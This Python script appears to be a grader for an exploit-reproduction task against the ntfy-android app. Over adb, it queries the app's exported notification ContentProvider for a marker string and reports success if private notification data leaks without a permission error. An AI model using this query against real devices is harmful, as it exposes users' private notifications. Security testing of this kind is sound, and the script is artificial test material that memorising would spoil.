#!/usr/bin/env python3
"""
Test script for ContentProvider SQLi / Permission Bypass in ntfy-android

This probe checks whether a local app can read private notification data
via the exported ContentProvider.

Exit codes:
- 0: Vulnerability successfully exploited
- 1: Exploit failed or vulnerability not present
- 2: Test environment not ready
"""

from pathlib import Path
import subprocess
import sys
import time

SCRIPT_DIR = Path(__file__).resolve().parent
MARKER_FILE = SCRIPT_DIR / "provider_marker.txt"


def run(cmd: list[str]) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True, timeout=15)


def adb_shell(cmd: str) -> subprocess.CompletedProcess:
    return run(["adb", "shell", cmd])


def detect_package() -> str | None:
    res = adb_shell("pm list packages")
    if res.returncode != 0:
        return None
    if "io.heckel.ntfy.debug" in res.stdout:
        return "io.heckel.ntfy.debug"
    if "io.heckel.ntfy" in res.stdout:
        return "io.heckel.ntfy"
    return None


def main() -> int:
    if not MARKER_FILE.exists():
        print("ERROR: Missing marker file. Run exploit.sh first.")
        return 2

    marker = MARKER_FILE.read_text().strip()
    if not marker:
        print("ERROR: Marker file is empty.")
        return 2

    package = detect_package()
    if not package:
        print("ERROR: ntfy-android is not installed or adb not available.")
        return 2

    authority = f"{package}.provider.notifications"
    where = f"message LIKE '%{marker}%'"
    for _ in range(20):
        res = adb_shell(
            f"content query --uri content://{authority}/notification --where \"{where}\""
        )
        output = (res.stdout or "") + (res.stderr or "")
        if "Permission Denial" in output or "SecurityException" in output:
            print("FAILURE: Provider access denied.")
            return 1
        if marker in output:
            print("SUCCESS: Provider leak detected.")
            return 0
        time.sleep(1)

    print("FAILURE: Provider leak not detected.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
